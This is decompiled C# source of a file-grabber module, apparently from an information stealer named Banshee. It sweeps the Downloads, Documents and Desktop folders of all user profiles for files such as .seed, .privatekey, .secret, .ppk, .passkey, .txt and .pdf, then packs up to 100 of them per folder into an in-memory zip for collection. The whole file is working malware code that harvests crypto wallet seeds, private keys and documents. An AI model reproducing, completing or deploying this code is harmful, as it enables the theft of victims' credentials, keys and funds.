﻿using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Threading;
using Banshee.Helper.Data;

namespace Banshee.Targets.Crypto
{
	// Token: 0x02000067 RID: 103
	public class Grabber : ITarget
	{
		// Token: 0x06000123 RID: 291 RVA: 0x00009024 File Offset: 0x00009024
		public void Collect(InMemoryZip zip, Counter counter)
		{
			using (CancellationTokenSource cancellationTokenSource = new CancellationTokenSource(Grabber.FileGrabberTimeout))
			{
				foreach (Grabber.TargetDirectory targetDirectory in this.GetTargetDirectories().ToList<Grabber.TargetDirectory>())
				{
					if (cancellationTokenSource.IsCancellationRequested)
					{
						break;
					}
					this.TraverseDirectory(zip, counter, targetDirectory.Path, targetDirectory.Path, targetDirectory.UserSegment, targetDirectory.Category, 0, cancellationTokenSource.Token);
				}
			}
		}

		// Token: 0x06000124 RID: 292 RVA: 0x000090C8 File Offset: 0x000090C8
		private IEnumerable<Grabber.TargetDirectory> GetTargetDirectories()
		{
			string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
			HashSet<string> hashSet = new HashSet<string>(StringComparer.OrdinalIgnoreCase);
			if (!string.IsNullOrWhiteSpace(folderPath) && Directory.Exists(folderPath))
			{
				hashSet.Add(folderPath);
			}
			try
			{
				DirectoryInfo parent = Directory.GetParent(folderPath ?? string.Empty);
				string text = (parent != null) ? parent.FullName : null;
				if (!string.IsNullOrWhiteSpace(text) && Directory.Exists(text))
				{
					foreach (string item in Directory.GetDirectories(text))
					{
						hashSet.Add(item);
					}
				}
			}
			catch
			{
			}
			foreach (string userDirectory in hashSet)
			{
				string userSegment = new DirectoryInfo(userDirectory).Name;
				foreach (string text2 in Grabber.TargetFolders)
				{
					string path = Path.Combine(userDirectory, text2);
					if (Directory.Exists(path))
					{
						yield return new Grabber.TargetDirectory(path, userSegment, text2);
					}
				}
				string[] array = null;
				userSegment = null;
				userDirectory = null;
			}
			HashSet<string>.Enumerator enumerator = default(HashSet<string>.Enumerator);
			yield break;
			yield break;
		}

		// Token: 0x06000125 RID: 293 RVA: 0x000090D4 File Offset: 0x000090D4
		private void TraverseDirectory(InMemoryZip zip, Counter counter, string currentPath, string rootPath, string userSegment, string category, int depth, CancellationToken token)
		{
			if (depth > 8 || token.IsCancellationRequested)
			{
				return;
			}
			this.ProcessFilesInDirectory(zip, counter, currentPath, rootPath, userSegment, category, token);
			if (depth >= 8 || token.IsCancellationRequested)
			{
				return;
			}
			try
			{
				foreach (string currentPath2 in Directory.GetDirectories(currentPath))
				{
					if (token.IsCancellationRequested)
					{
						break;
					}
					this.TraverseDirectory(zip, counter, currentPath2, rootPath, userSegment, category, depth + 1, token);
				}
			}
			catch (UnauthorizedAccessException)
			{
			}
			catch (PathTooLongException)
			{
			}
			catch (DirectoryNotFoundException)
			{
			}
		}

		// Token: 0x06000126 RID: 294 RVA: 0x0000917C File Offset: 0x0000917C
		private void ProcessFilesInDirectory(InMemoryZip zip, Counter counter, string currentPath, string rootPath, string userSegment, string category, CancellationToken token)
		{
			List<FileInfo> list = new List<FileInfo>();
			try
			{
				foreach (string text in Directory.GetFiles(currentPath))
				{
					if (token.IsCancellationRequested)
					{
						break;
					}
					string extension = Path.GetExtension(text);
					if (Grabber.TargetExtensions.Contains(extension))
					{
						try
						{
							FileInfo fileInfo = new FileInfo(text);
							if (fileInfo.Length > 0L && fileInfo.Length <= 1572864L)
							{
								list.Add(fileInfo);
							}
						}
						catch
						{
						}
					}
				}
			}
			catch (UnauthorizedAccessException)
			{
				return;
			}
			catch (PathTooLongException)
			{
				return;
			}
			catch (DirectoryNotFoundException)
			{
				return;
			}
			foreach (FileInfo fileInfo2 in (from f in list
			orderby f.Length descending
			select f).Take(100))
			{
				if (token.IsCancellationRequested)
				{
					break;
				}
				this.TryAddFile(zip, counter, fileInfo2, rootPath, userSegment, category);
			}
		}

		// Token: 0x06000127 RID: 295 RVA: 0x000092B4 File Offset: 0x000092B4
		private void TryAddFile(InMemoryZip zip, Counter counter, FileInfo fileInfo, string rootPath, string userSegment, string category)
		{
			byte[] content;
			try
			{
				content = File.ReadAllBytes(fileInfo.FullName);
			}
			catch
			{
				return;
			}
			string text = Grabber.BuildEntryPath(Grabber.GetRelativePath(rootPath, fileInfo.FullName), userSegment, category);
			try
			{
				zip.AddFile(text, content);
				counter.FilesGrabber.Add(fileInfo.FullName + " => " + text);
			}
			catch
			{
			}
		}

		// Token: 0x06000128 RID: 296 RVA: 0x00009330 File Offset: 0x00009330
		private static string GetRelativePath(string rootPath, string filePath)
		{
			if (string.IsNullOrEmpty(rootPath))
			{
				return Path.GetFileName(filePath);
			}
			try
			{
				string text = Grabber.NormalizePath(rootPath);
				string text2 = Grabber.NormalizePath(filePath);
				if (text2.StartsWith(text, StringComparison.OrdinalIgnoreCase))
				{
					int num = text.Length;
					if (num < text2.Length && (text2[num] == Path.DirectorySeparatorChar || text2[num] == Path.AltDirectorySeparatorChar))
					{
						num++;
					}
					if (num <= text2.Length)
					{
						return text2.Substring(num).TrimStart(new char[]
						{
							Path.DirectorySeparatorChar,
							Path.AltDirectorySeparatorChar
						});
					}
				}
			}
			catch
			{
			}
			return Path.GetFileName(filePath);
		}

		// Token: 0x06000129 RID: 297 RVA: 0x000093E0 File Offset: 0x000093E0
		private static string NormalizePath(string path)
		{
			return Path.GetFullPath(path ?? string.Empty).TrimEnd(new char[]
			{
				Path.DirectorySeparatorChar,
				Path.AltDirectorySeparatorChar
			});
		}

		// Token: 0x0600012A RID: 298 RVA: 0x0000940C File Offset: 0x0000940C
		private static string BuildEntryPath(string relativePath, string userSegment, string category)
		{
			List<string> list = new List<string>
			{
				"FileGrabber"
			};
			if (!string.IsNullOrWhiteSpace(userSegment))
			{
				list.Add(userSegment);
			}
			if (!string.IsNullOrWhiteSpace(category))
			{
				list.Add(category);
			}
			if (!string.IsNullOrWhiteSpace(relativePath))
			{
				list.Add(relativePath);
			}
			return Path.Combine(list.ToArray()).Replace('\\', '/');
		}

		// Token: 0x040000D6 RID: 214
		private const long MaxDocumentSize = 1572864L;

		// Token: 0x040000D7 RID: 215
		private const int MaxDepth = 8;

		// Token: 0x040000D8 RID: 216
		private static readonly string[] TargetFolders = new string[]
		{
			"Downloads",
			"Documents",
			"Desktop"
		};

		// Token: 0x040000D9 RID: 217
		private static readonly TimeSpan FileGrabberTimeout = TimeSpan.FromMinutes(3.0);

		// Token: 0x040000DA RID: 218
		private static readonly HashSet<string> TargetExtensions = new HashSet<string>(StringComparer.OrdinalIgnoreCase)
		{
			".txt",
			".pdf",
			".seed",
			".privatekey",
			".secret",
			".ppk",
			".pk",
			".passkey"
		};

		// Token: 0x02000068 RID: 104
		private sealed class TargetDirectory
		{
			// Token: 0x0600012D RID: 301 RVA: 0x0000951E File Offset: 0x0000951E
			public TargetDirectory(string path, string userSegment, string category)
			{
				this.Path = path;
				this.UserSegment = userSegment;
				this.Category = category;
			}

			// Token: 0x17000012 RID: 18
			// (get) Token: 0x0600012E RID: 302 RVA: 0x0000953B File Offset: 0x0000953B
			public string Path { get; }

			// Token: 0x17000013 RID: 19
			// (get) Token: 0x0600012F RID: 303 RVA: 0x00009543 File Offset: 0x00009543
			public string UserSegment { get; }

			// Token: 0x17000014 RID: 20
			// (get) Token: 0x06000130 RID: 304 RVA: 0x0000954B File Offset: 0x0000954B
			public string Category { get; }
		}
	}
}
